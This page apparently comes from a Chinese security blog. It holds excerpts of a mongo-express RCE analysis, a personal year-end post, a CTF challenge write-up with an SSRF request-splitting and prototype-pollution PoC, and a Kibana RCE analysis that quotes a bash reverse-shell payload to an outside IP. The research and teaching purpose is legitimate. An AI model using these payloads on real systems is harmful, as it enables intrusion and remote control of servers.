<p>但是如果以cli+指定用户形式启动服务端与mongo的连接时，则不需要授权也能打(个人认为这种方式更常见一点?)<br><img src="http://static.zybuluo.com/1160307775/so63suhp0hmj3thu9axhunmf/image_1du1fiujq1v2r1icnt5t3lctg69.png" alt="image_1du1fiujq1v2r1icnt5t3lctg69.png-524.8kB"></p>
<p>下面是关于mongo-express调用<code>basic-auth-connect</code>的认证简单分析</p>
<h2 id="认证流程分析"><a href="#认证流程分析" class="headerlink" title="认证流程分析"></a>认证流程分析</h2><p>程序入口逻辑是这样的，如果你程序启动的时候给一个-u&amp;-p参数则<code>config.useBasicAuth</code>为false，而<code>config.useBasicAuth</code>在加载配置的阶段默认为true</p>
<pre><code>if (commander.username &amp;&amp; commander.password) {
...
config.useBasicAuth = false;
}</code></pre><p>接着看文件<code>express-mongo/node_modules/mongo-express/lib/router.js</code>，根据<code>config.useBasicAuth</code>的值绑定一个<code>basicAuth</code>中间键，如果初始启动程序的时候没有-u/-p参数，则获取配置文件的username&amp;password(默认为admin:pass)来进行绑定</p>
<p><img src="http://static.zybuluo.com/1160307775/s00s25eqbwv3p7idk9ei0xjs/image_1dtntgtmr1cep1la29dnuaevf45d.png" alt="image_1dtntgtmr1cep1la29dnuaevf45d.png-591kB"></p>
<p>这里假设我们启动程序的时候默认不传入-u/-p，则步入<code>basicAuth</code>函数。这里定义了两个全局变量<code>username</code>&amp;<code>password</code>，来存储配置文件的用户名密码。</p>
<pre><code>module.exports = function basicAuth(callback, realm) {
  var username, password;

  // user / pass strings
  if (&#39;string&#39; == typeof callback) {
    username = callback;
    password = realm;
    if (&#39;string&#39; != typeof password) throw new Error(&#39;password argument required&#39;);
    realm = arguments[2];
    callback = function(user, pass){
      return user == username &amp;&amp; pass == password;
    }
  }

  realm = realm || &#39;Authorization Required&#39;;

  return function(req, res, next) {
    var authorization = req.headers.authorization;

    if (req.user) return next();
    if (!authorization) return unauthorized(res, realm);

    var parts = authorization.split(&#39; &#39;);

    if (parts.length !== 2) return next(error(400));

    var scheme = parts[0]
      , credentials = new Buffer(parts[1], &#39;base64&#39;).toString()
      , index = credentials.indexOf(&#39;:&#39;);

    if (&#39;Basic&#39; != scheme || index &lt; 0) return next(error(400));

    var user = credentials.slice(0, index)
      , pass = credentials.slice(index + 1);

    // async
    if (callback.length &gt;= 3) {
      callback(user, pass, function(err, user){
        if (err || !user)  return unauthorized(res, realm);
        req.user = req.remoteUser = user;
        next();
      });
    // sync
    } else {
      if (callback(user, pass)) {
        req.user = req.remoteUser = user;
        next();
      } else {
        unauthorized(res, realm);
      }
    }
  }
};</code></pre><p>在这之后的所有请求则必须都要有<code>req.headers.authorization</code>，来与全局变量<code>username</code>&amp;<code>password</code>比对进行认证，否则返回Unauthorized。</p>
<p>所以要想不进入<code>basicAuth</code>函数，只需要<code>config.useBasicAuth = false</code></p>
<h2 id="cli启动-未授权"><a href="#cli启动-未授权" class="headerlink" title="cli启动-未授权"></a>cli启动-未授权</h2><p>在mongo-express中还有一种启动方式，即用命令行传递参数。<br><img src="http://static.zybuluo.com/1160307775/ju6aewyf8sm5po3yu3r18urz/image_1dto26qrj1bge18bm6o41o13bn667.png" alt="image_1dto26qrj1bge18bm6o41o13bn667.png-44.5kB"></p>
<p>由于poc中，用docker拉的mongodb默认是未授权的形式，所以不需要-u&amp;-p来指定数据库的账号密码。但是实际环境中mongodb不太可能是未授权，所以我觉得以cli+参数启动服务的场景应该算是多见吧。</p>
<p>那么如果受害者指定了用户名&amp;密码去启动express-mongo，那么攻击者直接未授权就可以打(即不需要指定authoriza header)</p>
<p>不过在官方文档中给出了一句话:</p>
<pre><code>You can use the following environment variables to modify the container&#39;s configuration</code></pre><p>因为config.default.js默认会从环境变量中加载mongodb的用户名&amp;密码，这样无需参数就能启动服务，也顺便避免了未授权的问题</p>
<h1 id="官方修复"><a href="#官方修复" class="headerlink" title="官方修复"></a>官方修复</h1><p><a href="https://github.com/mongo-express/mongo-express/commit/d8c9bda46a204ecba1d35558452685cd0674e6f2" target="_blank" rel="noopener">https://github.com/mongo-express/mongo-express/commit/d8c9bda46a204ecba1d35558452685cd0674e6f2</a></p>
<p>在0.54.0中将bson.js中的vm依赖删除，改用<code>mongo-query-parser</code></p>
<p><img src="http://static.zybuluo.com/1160307775/abenhjn0g17fc8ef5jlgjvd2/image_1dtohg4gq10ehc9k100fbfq11ok8u.png" alt="image_1dtohg4gq10ehc9k100fbfq11ok8u.png-32.5kB"></p>
<h1 id="express分析"><a href="#express分析" class="headerlink" title="express分析"></a>express分析</h1><p>框架流程，使用一堆中间键</p>
<p>然后启动流程就是对中间键的层级调用，具体看这篇文章:<a href="https://shadowwood.me/2016/08/27/2016-08-27-express-origin-code-analysis/" target="_blank" rel="noopener">https://shadowwood.me/2016/08/27/2016-08-27-express-origin-code-analysis/</a></p>
<pre><code>核心的两步:
layer.handle_request(req, res, next);

/*
handle_request定义的就是express应用中的路由中间件请求处理函数，也就是例如app.get(‘/test’, function(req, res, next){})的操作最后的执行位置。
*/

/*
layer.handle_request会执行layer.route的dispatch操作，也就是在Route中派发路由最终执行到在express中定义的对应的路由操作函数，之后又执行next()就又到了这里的proto.stack中的下一个遍历操作。
*/


//handle_request原生是这样写的:

Layer.prototype.handle_request = function handle(req, res, next) {
  var fn = this.handle;

  if (fn.length &gt; 3) {
    // not a standard request handler
    return next();
  }

  try {
    fn(req, res, next);
  } catch (err) {
    next(err);
  }
};
</code></pre>
                
            </div>
            <div class="continue">
            <a href="/2020/01/03/CVE-2019-10758-mongo-expressRCE复现分析/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2020/01/01/My 2019/"> 
                    My 2019 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2020-01-01   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/博客文章/">博客文章</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="My-2019"><a href="#My-2019" class="headerlink" title="My 2019"></a>My 2019</h1><p>9102年的最后一天，按照国际惯例还是要记录一下。</p>
<p>从18年底到现在，大大小小的flag立了无数，自己都忘记完成了些什么，又有多少计划搁浅了。2019年最遗憾的是懒狗的本质还是没有改掉。</p>
<p>记得18年的这个时候我给自己定了个标签叫”蜕变”。因为18年是我大学入门安全的第一年，从一知半解到求知的过程像是破茧成蝶，充满坎坷但是有股奋斗的劲头。</p>
<p>然而，我想了很久也没能找到合适的词汇来描述19这一年，绞尽脑汁也没想起来今年都做过哪些有意义的事。无论是天南海北的打比赛、还是去学着挖洞，都比不上18年那股热情。好在当初立下的flag还是完成了一些，勉强也算是在技术上有一些进步，那干脆19年就叫”自定义”好了。</p>
<p>“自定义”了些什么呢？挖洞/审计/CTF？感觉每样都沾边，但是每样又没做到很好。懒狗的毛病又被无限化放大，干啥都是三分钟热度。举个例子来说：当初说要好好挖SRC，结果自动化的工具写了几天就去玩儿了，亦或者被其他琐事缠身(搬砖)，没有持之以恒。有位大师傅说得好，搞安全、挖漏洞，讲求的不光是门路多、思路广，还要学会坐得住、坐得稳。也希望自己来年可以学会如何<strong>专心</strong></p>
<p>记录一下2019年自己小赚人生第一桶金吧，虽然挣的确实不多，而且也特别累。上半年入手了自己的mbp，下半年猪肉涨价全用来吃饭了。可能是信安这个行业在今年突然变火的原因吧，还是搬了一些小砖，也浪费了不少时间。下半年以后太懒了也就不做这些了，主要原因还是想去多学点东西。通过hw或者一些其他项目对信安这个专业有了一些收入的认知。只要live as a tool man，还是能取得不错的薪资，但这必不可能是我们的归途。我是永远觉得金钱&lt;&lt;热情，希望自己在未来能够有能力说出这句话。</p>
<p>未来的一年要备战考研，博客大概率会长草，打算趁着寒假还有时间就多发几篇</p>
<p>20，继续做那个有点理想的普通人。</p>
<p>最后，祝这个世界依旧热闹，祝我仍是我。</p>

                
            </div>
            <div class="continue">
            <a href="/2020/01/01/My 2019/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/12/01/I-SOON2019-Membershop出题思路/"> 
                    I-SOON2019-Membershop出题思路 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-12-01   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/小组-学校/">小组/学校</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>今年是第二年出题，鉴于去年题目过于简单(去年我是真的sb且敷衍)，今年题目我憋了蛮长时间的(狗日的前端)，本希望做到这题的师傅们能有所收获。但是比赛跟各位师傅的时间还是冲突了，加之校赛的局限，实际也没多少人在打。比赛当天下午，Membershop容器的峰值也就5、6个的样子。其实题目并不是很难。</p>
<p>虽然最后没能达到自己预期的做题效果，算是有点点失望吧。但是我相信D0g3一定能把比赛办出去，感谢运维小哥@0akarma跟我一起调试动态容器的bug，关于全部的题目环境在:<a href="http://dao.ge/isoon2019" target="_blank" rel="noopener">http://dao.ge/isoon2019</a></p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>题目开源地址:<a href="https://github.com/Hpd0ger/My_ctf_challenge/" target="_blank" rel="noopener">https://github.com/Hpd0ger/My_ctf_challenge/</a></p>
<p>修改index.js的server_ip为环境的ip</p>
<pre><code>docker-compose build
docker-compose up -d</code></pre><h1 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h1><p>登陆的时候过滤了admin，同时发现小写字符转换成了大写字母显示。结合set-cookie是koa的框架，很容易联想到后端使用<code>toUpperCase()</code>做转换，拉丁文越权登陆<code>admın</code></p>
<p><img src="http://static.zybuluo.com/1160307775/uevaveqvu1j6y2trkxfhf08u/image_1dr12lu22vs4iq44id1vuas21m.png" alt="image_1dr12lu22vs4iq44id1vuas21m.png-38.1kB"></p>
<p>登陆成功之后多了一个请求记录的功能，同时登陆成功后给出源码的地址</p>
<p><img src="http://static.zybuluo.com/1160307775/vmsnv0pzmurxdz2amugpr9br/image_1dr12phlo1hc31vqi17fvahuhgr16.png" alt="image_1dr12phlo1hc31vqi17fvahuhgr16.png-48.1kB"></p>
<p>拿到源码后简单看登陆逻辑<br><img src="http://static.zybuluo.com/1160307775/w044ik52f2r0v4qy9dztwfc2/image_1dmbk6vlo19d413cc13h8b108q913.png" alt="image_1dmbk6vlo19d413cc13h8b108q913.png-57.7kB"></p>
<p>逻辑根据传入的用户名<code>userName</code>会在登陆前经过一次检测<br><img src="http://static.zybuluo.com/1160307775/1sn9fw27548pjpjy0yfishg4/image_1dmbk45jltj28kro9c1kjdkshm.png" alt="image_1dmbk45jltj28kro9c1kjdkshm.png-65.8kB"></p>
<p>当传入的用户名包含<code>admin</code>时，则自动循环replace掉。在登陆成功的同时会把<code>username</code>写进session里，这里可以看到只有我们登陆了<code>admin</code>才有权限加载其他模版<br><img src="http://static.zybuluo.com/1160307775/8rvxorv0r9e3u03r6vjzyo2u/image_1dmbkcg89ijlmd61vef209bti1g.png" alt="image_1dmbkcg89ijlmd61vef209bti1g.png-160.3kB"></p>
<p>漏洞点在代码76-117行，它只允许请求以<code>http://127.0.0.1:3000/query</code>(后面拉到本地环境会改127.0.0.1这个地址，这是我本地debug)开头的url。输入其他开头的url会被<code>error url</code>，而且不存在任何host的绕过。当请求之后会被记录在sandbox的results.txt里面并且支持追加，sandbox根据ip建立<br><img src="http://static.zybuluo.com/1160307775/1fkgcdl7j1qc7v6dcjf6tdxm/image_1dmbkrtpt1pkv1q561o9kf2p10hj2n.png" alt="image_1dmbkrtpt1pkv1q561o9kf2p10hj2n.png-28.9kB"><br><img src="http://static.zybuluo.com/1160307775/sl6ii6qt9zm6mj7jrfhsetsp/image_1dmbku3fk399n211cvq49r1emt34.png" alt="image_1dmbku3fk399n211cvq49r1emt34.png-33.7kB"></p>
<p>因为query也是一个路由，那么这里就存在一个ssrf。如何bypass去请求其他路由呢？只需要用unicode编码并且分割http包，例如</p>
<pre><code>http://127.0.0.1:3000/query?param=1\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1:3000\u{010D}\u{010A}Connection:\u{0120}keep-alive\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0173}\u{0161}\u{0176}\u{0165}</code></pre><p>url编码是16进制，\u{01xx}在http.get的时候不会进行percent encode，但是在buffer写入的时候会把xx解码。其中<code>\u{0173}\u{0161}\u{0176}\u{0165}</code>代表的是<code>save</code>，73617665是<code>save</code>的16进制表示。具体原理可以看:<a href="https://www.4hou.com/vulnerable/13637.html" target="_blank" rel="noopener">通过拆分请求来实现的SSRF攻击</a></p>
<p>接着就寻找一下其他路由存在的问题，可利用点在<code>/save</code></p>
<pre><code>home.get(&#39;/save&#39;,async(ctx)=&gt;{
    let ip = ctx.request.ip;
    let reqbody = {switch:false}
    reqbody = qs.parse(ctx.querystring,{allowPrototypes: false});

    if (ip.substr(0, 7) == &quot;::ffff:&quot;) {
        ip = ip.substr(7);
    }
    if (ip !== &#39;127.0.0.1&#39; &amp;&amp; ip !== server_ip) {
        ctx.status = 403;
        ctx.response.body = &#39;403: You are not the local user&#39;;
    }else {
        if(reqbody.switch === true &amp;&amp; reqbody.sandbox &amp;&amp; reqbody.opath &amp;&amp;fs.existsSync(reqbody.spath)){
            if(fs.existsSync(reqbody.sandbox)){
                paths.opath = fs.readdirSync(reqbody.sandbox)[0];
            }else if(fs.existsSync(reqbody.opath)){
                let buffer;
                tmp[reqbody.sandbox][&#39;opath&#39;] = reqbody.opath;
                if(/[flag]/.test(tmp[reqbody.sandbox][&#39;opath&#39;])){
                    buffer = tmp[reqbody.sandbox][&#39;opath&#39;].replace(/f|l|a|g/g,&#39;&#39;);
                }else{
                    buffer = reqbody.opath;
                }
            }
            let opath = paths.opath? paths.opath : buffer;
            let text = fs.readFileSync(opath, &#39;utf8&#39;);
            await WriteResults(reqbody.spath,text);

        }else{
            return false;
        }
    }
})</code></pre><p>这里大致有两个障碍点：</p>
<p>1、限制了本地127.0.0.1访问<br>-&gt;ssrf解决</p>
<p>2、通过qs包解析url参数存为对象，switch默认为flase，配置<code>allowPrototypes=false</code>，直接传递http参数不能覆盖switch。qs.parse() bypass for prototype pollution@qs&lt;6.3，参考链接:<a href="https://snyk.io/vuln/npm:qs:20170213" target="_blank" rel="noopener">Prototype Override Protection Bypass</a>，传参:<code>]=switch</code>绕过</p>
<p>3、解析获得的对象需要三个参数sandbox、opath、spath。代码逻辑就是如果存在sandbox那么就取sandbox下的第一个文件(即results.txt)读取后写入spath，否则读取自定义的opath，将结果写入spath(两者前提都是spath必须存在且可写，只有sandbox/result.txt满足要求)。但是自定义opath会替换所有的[flag]字段，不允许直接读flag。</p>
<p>这里存在判断的绕过。原型链污染sandbox下的一个文件为/flag，再去自定义读到spath里</p>
<pre><code>tmp[&#39;__proto__&#39;][&#39;opath&#39;] = &#39;/flag&#39;;
=&gt;
paths.opath = /flag</code></pre><p>构造一下就能把flag追加写入到sandbox/results.txt。poc如下，调整一下opath为flag地址，sandbox为自己的<code>md5(ip)</code>就行了：</p>
<pre><code>encodeURI(&quot;http://127.0.0.1:3000/query?param=1\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1:3000\u{010D}\u{010A}Connection:\u{0120}keep-alive\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0173}\u{0161}\u{0176}\u{0165}?]=switch&amp;sandbox=__proto__&amp;opath=/flag&amp;spath=tmp/ab54a5cf83f67d827ecba68e394f9196&quot;)</code></pre>
                
            </div>
            <div class="continue">
            <a href="/2019/12/01/I-SOON2019-Membershop出题思路/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/11/20/从Kibana-RCE对nodejs子进程创建的思考/"> 
                    从Kibana-RCE对nodejs子进程创建的思考 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-11-20   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端安全/">前端安全</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="从Kibana-RCE对nodejs子进程创建的思考"><a href="#从Kibana-RCE对nodejs子进程创建的思考" class="headerlink" title="从Kibana-RCE对nodejs子进程创建的思考"></a>从Kibana-RCE对nodejs子进程创建的思考</h1><p>在前几天Kibana有一则关于原型链污染+子进程调用=&gt;rce的漏洞，跟进分析的时候发现child_process实现子进程创建确实存在trick。于是有了下文是对child_process的实现和Kibana RCE的一点思考。</p>
<h1 id="child-process建立子进程的实现"><a href="#child-process建立子进程的实现" class="headerlink" title="child_process建立子进程的实现"></a>child_process建立子进程的实现</h1><p>对于child_process大家应该都不陌生，它是nodejs内置模块，用于新建子进程，在CTF题目中也常使用<code>require(&#39;child_process&#39;).exec(&#39;xxx&#39;)</code>来RCE。</p>
<p>child_process内置了6个方法:execFileSync、execSync、fork、exec、execFile、spawn()</p>
<p>其中execFileSync()调用spawnSync()，execSync()调用spawnSync()，而spawnSync()调用spawn();exec()调用execFile()，而execFile()调用spawn();fork()调用spawn()。也就是说前6个方法最终都是调用spawn()，而spawn()的本质是创建ChildProcess的实例并返回。那我们直接对spawn这个方法进行分析</p>
<p>测试代码:</p>
<pre><code>const { spawn } = require(&#39;child_process&#39;);

spawn(&#39;whoami&#39;).stdout.on(&#39;data&#39;, (data) =&gt; {
    console.log(`stdout: ${data}`);
  });</code></pre><p>Node使用模块<code>child_process</code>建立子进程时，调用<code>用户层面的spawn</code>方法。初始化子进程的参数，进入方法<code>normalizeSpawnArguments</code></p>
<pre><code>var spawn = exports.spawn = function(/*file, args, options*/) {
  var opts = normalizeSpawnArguments.apply(null, arguments);
};</code></pre><p>跟进方法<code>normalizeSpawnArguments</code>，当options不存在时将options命为空对象。接着到下面最关键的一步，即获取env变量的方式。首先对options.env是否存在做了判断，如果options.env为undefined则将环境变量<code>process.env</code>的值复制给env。而后对envParivs这个数组进行push操作，其实就是env变量对应的键值对。</p>
<pre><code>function normalizeSpawnArguments(file, args, options) {
    ...//省略
  if (options === undefined)
    options = {};

    ...//省略
  var env = options.env || process.env;
  var envPairs = [];

  for (var key in env) {
    envPairs.push(key + &#39;=&#39; + env[key]);
  }

  _convertCustomFds(options);

  return {
    file: file,
    args: args,
    options: options,
    envPairs: envPairs
  };
}</code></pre><p><img src="http://static.zybuluo.com/1160307775/70133nyslwwm715le1gimvfi/image_1dpddlch71nmr1v2g1jgs1guv18nj2a.png" alt="image_1dpddlch71nmr1v2g1jgs1guv18nj2a.png-386.4kB"></p>
<p>这里就存在一个问题，options默认为空对象，那么它的<strong>任何属性</strong>都存在被污染的可能。所以只要能污染到<code>Object.prototype</code>，那么options就可以添加我们想要的任何属性，包括<code>options.env</code>。经过<code>normalizeSpawnArguments</code>封装并返回后，建立新的子进程<code>new ChildProcess()</code>，这里才算进入内部child_process的实现。</p>
<pre><code>var opts = normalizeSpawnArguments.apply(null, arguments);
var options = opts.options;
var child = new ChildProcess();

child.spawn({
file: opts.file,
args: opts.args,
cwd: options.cwd,
windowsVerbatimArguments: !!options.windowsVerbatimArguments,
detached: !!options.detached,
envPairs: opts.envPairs,
stdio: options.stdio,
uid: options.uid,
gid: options.gid
});</code></pre><p>我们直接看<code>ChildProcess.spawn</code>如何实现，也就是原生的spawn。核心代码逻辑是下面的两句，具体代码在<code>process_wrap.cc</code></p>
<pre><code>ChildProcess.prototype.spawn = function(options) {
  //...
  var err = this._handle.spawn(options);
  //...
  // Add .send() method and start listening for IPC data
  if (ipc !== undefined) setupChannel(this, ipc);
  return err;
};</code></pre><p><code>this._handle.spawn</code>调用了<code>process_wrap.cc</code>的spawn来生成子进程，是node子进程创建的底层实现，那我们看一下<code>process_wrap.cc</code>中对options的值进行了怎样的操作，。</p>
<pre><code>  static void Spawn(const FunctionCallbackInfo&lt;Value&gt;&amp; args) {
    //获取js传过来的第一个option参数
    Local&lt;Object&gt; js_options = args[0]-&gt;ToObject(env-&gt;context()).ToLocalChecked();

    ...
    // options.env
    Local&lt;Value&gt; env_v =
        js_options-&gt;Get(context, env-&gt;env_pairs_string()).ToLocalChecked();
    if (!env_v.IsEmpty() &amp;&amp; env_v-&gt;IsArray()) {
      Local&lt;Array&gt; env_opt = Local&lt;Array&gt;::Cast(env_v);
      int envc = env_opt-&gt;Length();
      CHECK_GT(envc + 1, 0);  // Check for overflow.
      options.env = new char*[envc + 1];  // Heap allocated to detect errors.
      for (int i = 0; i &lt; envc; i++) {
        node::Utf8Value pair(env-&gt;isolate(),
                             env_opt-&gt;Get(context, i).ToLocalChecked());
        options.env[i] = strdup(*pair);
        CHECK_NOT_NULL(options.env[i]);
      }
      options.env[envc] = nullptr;
    }
    ...

    //调用uv_spawn生成子进程，并将父进程的event_loop传递过去
    int err = uv_spawn(env-&gt;event_loop(), &amp;wrap-&gt;process_, &amp;options);
    //省略
  }</code></pre><p>代码只截取了对env这个属性的操作，它将原先的envPairs进行封装。最后所有options带入<code>uv_spawn</code>来生成子进程，在<code>uv_spawn</code>中就是常规的fork()、waitpid()来控制进程的产生和资源释放，不过有一个非常重要的实现如下:</p>
<pre><code>//process.cc-&gt;uv_spawn()

execvp(options-&gt;file, options-&gt;args);</code></pre><p>execvp来执行任务，这里的options-&gt;file就是我们最初传给spawn的参数。比如我们的例子是<code>spawn(&#39;whoami&#39;)</code>，那么此时的file就是<code>whoami</code>，当然对于有参数的命令，则options-&gt;args与之对应。</p>
<h2 id="总结流程"><a href="#总结流程" class="headerlink" title="总结流程"></a>总结流程</h2><p>child_process创建子进程的流程看起来有些复杂，总结一下:</p>
<p>1、初始化子进程需要的参数，设置环境变量<br>2、fork()创建子进程，并用<code>execvp</code>执行系统命令。<br>3、ipc通信，输出捕捉</p>
<h1 id="Kibana-RCE"><a href="#Kibana-RCE" class="headerlink" title="Kibana-RCE"></a>Kibana-RCE</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先引用漏洞原作者的举例<br><img src="http://static.zybuluo.com/1160307775/bhalsijd98obd3c2u5bctmpz/image_1dpfrsth1180fc11uprr5j1r0713.png" alt="image_1dpfrsth1180fc11uprr5j1r0713.png-74.8kB"></p>
<p>node的官方文档中也能找到相同的用例:<a href="https://nodejs.org/api/cli.html#cli_node_options_options，node版本&gt;v8.0.0以后支持运行node时增加一个命令行参数NODE_OPTIONS，它能够包含一个js脚本，相当于include。" target="_blank" rel="noopener">https://nodejs.org/api/cli.html#cli_node_options_options，node版本&gt;v8.0.0以后支持运行node时增加一个命令行参数NODE_OPTIONS，它能够包含一个js脚本，相当于include。</a><br><img src="http://static.zybuluo.com/1160307775/dtx12zmomo7zm16h5mu9mvd8/image_1dpfrn6951t43bqt2prj21l9im.png" alt="image_1dpfrn6951t43bqt2prj21l9im.png-142.2kB"></p>
<p>在node进程启动的时候作为环境变量加载，通过打印process.env也能证明</p>
<pre><code>hpdoger@ChocoMacBook-Pro$ NODE_OPTIONS=&#39;--require ./evil.js&#39; node
success!!!

&gt; process.env.NODE_OPTIONS
&#39;--require ./evil.js&#39;</code></pre><p>如果我们能改变本地环境变量，则在node创建进程的时候就可以包含恶意语句。尝试用export来实现如下。<br><img src="http://static.zybuluo.com/1160307775/39a5x7o5hdzs8ql0pbo3cbho/image_1dpfsa9vei1kk2g1f5a1qchv531g.png" alt="image_1dpfsa9vei1kk2g1f5a1qchv531g.png-27.1kB"></p>
<p>事实证明，只要产生新进程就会加载一次本地环境变量，存储形式为process.env，若env中存在NODE_OPTIONS则进行相应的加载。但是这种需要bash漏洞就是耍流氓，于是作者想到了一种方法来污染process.env，也就是上文分析的env的获取，于是有了Kibana的poc</p>
<pre><code>.es(*).props(label.__proto__.env.AAAA=&#39;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.0.136/12345 0&gt;&amp;1&quot;);process.exit()//&#39;)
.props(label.__proto__.env.NODE_OPTIONS=&#39;--require /proc/self/environ&#39;)</code></pre><p>node运行时会把当前进程的env写进系统的环境变量，子进程也一样，在linux中存储为<code>/proc/self/environ</code>。通过污染env把恶意的语句写进/proc/self/environ。同时污染<code>process.NODE_OPTIONS</code>属性，使node在生成新进程的时候，包含我们构造的<code>/proc/self/environ</code>。具体操作就类似下面的用法<br><img src="http://static.zybuluo.com/1160307775/401us91ytoegl88xvsh0zj3a/image_1dpftrvc7qk59jmbjg17lk1f4b2d.png" alt="image_1dpftrvc7qk59jmbjg17lk1f4b2d.png-23.8kB"></p>
<p>污染了Object.env之后，利用Canvas生成新进程的时候会执行spawn从而RCE</p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>最开始我并没有跟进Kibana的源码，只是把漏洞归结于:</p>
<pre><code>污染Object.env+创建子进程 =&gt; RCE</code></pre><p>于是我做了下面的测试，发现并没有像我想象中的输出evil.js中的内容，但是NODE_OPTIONS确实被写进了子进程的env。<br><img src="http://static.zybuluo.com/1160307775/pxl3up7lfbbj8966hg0t49cu/image_1dpfugpbejdu1cos1cra12pv11mr4p.png" alt="image_1dpfugpbejdu1cos1cra12pv11mr4p.png-102.2kB"></p>
<p>当我将进程建立换为<code>proc.fork()</code>时，则成功加载了evil.js并输出<br><img src="http://static.zybuluo.com/1160307775/400rh8hi6z4231wta13ll6l6/image_1dpfuioo51pov0m17et1as61ibf56.png" alt="image_1dpfuioo51pov0m17et1as61ibf56.png-126.9kB"></p>
<p>child_process.fork() 方法是 child_process.spawn() 的一个特例，专门用于衍生新的 Node.js 进程。 与 child_process.spawn() 一样返回 ChildProcess 对象。所以fork调用的是spawn来实现的子进程创建，那怎么会有这种情况？跟进一下fork看看实现有什么不同</p>
<pre><code>exports.fork = function(modulePath /*, args, options*/) {
    ...//省略
    options.execPath = options.execPath || process.execPath;
    return spawn(options.execPath, args, options);
}</code></pre><p>它处理了execPath这个属性，默认获取系统变量的process.execPath，再传入spawn，这里就是<code>node</code>。<br><img src="http://static.zybuluo.com/1160307775/3som47zksrvzoyeta5xufflt/image_1dpfv09ba1lqiq4eglf17fmdgc63.png" alt="image_1dpfv09ba1lqiq4eglf17fmdgc63.png-62.4kB"></p>
<p>而我们用spawn时，处理得到的file为<code>whoami</code><br><img src="http://static.zybuluo.com/1160307775/l68vdzmr5twb7bkh9dwtpw1i/image_1dpfvg05d1kth1o5n6adan9b8k6g.png" alt="image_1dpfvg05d1kth1o5n6adan9b8k6g.png-202.9kB"></p>
<p>上文分析child_process在子进程创建的最底层，会调用execvp执行命令执行file</p>
<pre><code>execvp(options-&gt;file, options-&gt;args);</code></pre><p>而上面poc核心就是<code>NODE_OPTIONS=&#39;--require /proc/self/environ&#39; node</code>，即bash调用了node去执行。所以此处的file值必须为node，否则无法将NODE_OPTIONS载入。而直接调用spawn函数时必须有file值，这也造成了第一种代码无法加载evil.js的情况<br><img src="http://static.zybuluo.com/1160307775/sj60p3ly3wetghpqf9oitvn5/image_1dpg0ajvt1b051icfapj1eaupi67a.png" alt="image_1dpg0ajvt1b051icfapj1eaupi67a.png-58.5kB"></p>
<p>经过测试exec、execFile函数无论传入什么命令，file的值都会为<code>/bin/sh</code>，因为参数shell默认为true。即使不传入options选项，这两个命令也会默认定义options，这也是child_process防止命令执行的一种途径。<br><img src="http://static.zybuluo.com/1160307775/5ed7bm1z723crkc08l0279cr/image_1dpg1kbn81deo1e4aeai11jebbn9.png" alt="image_1dpg1kbn81deo1e4aeai11jebbn9.png-26kB"></p>
<p>但是shell这个变量也是可以被污染的，不过child_process在这里做了限制，即使shell===false或字符串。最终传到execvp时也会被执行的参数替代，而不是真正的node进程。</p>
<p>这样看来在污染了原型的条件下，child_process只有进行了fork()的时候，才能达到漏洞的利用。不过这样的利用面确实太窄了，如果有师傅研究过其他函数的执行spawn时能启动node进程，可以交流一下思路</p>
<p>所以回到fork()函数，我们可以验证包含/proc/self/environ是可行的</p>
<pre><code>// test.js
proc = require(&#39;child_process&#39;);
var aa = {}
aa.__proto__.env = {&#39;AAAA&#39;:&#39;console.log(123)//&#39;,&#39;NODE_OPTIONS&#39;:&#39;--require /proc/self/environ&#39;}
proc.fork(&#39;./function.js&#39;);

//function.js
console.log(&#39;this is func&#39;)</code></pre><p><img src="http://static.zybuluo.com/1160307775/uzueehmtlujd7zwq0belponu/image_1dpindplj1ocv1q5o1ksf11v510o89.png" alt="image_1dpindplj1ocv1q5o1ksf11v510o89.png-23.3kB"></p>
<p>同时可以看到，fork在指定了modulepath的情况下，包含environ的同时并不影响modulepath中代码的执行。</p>
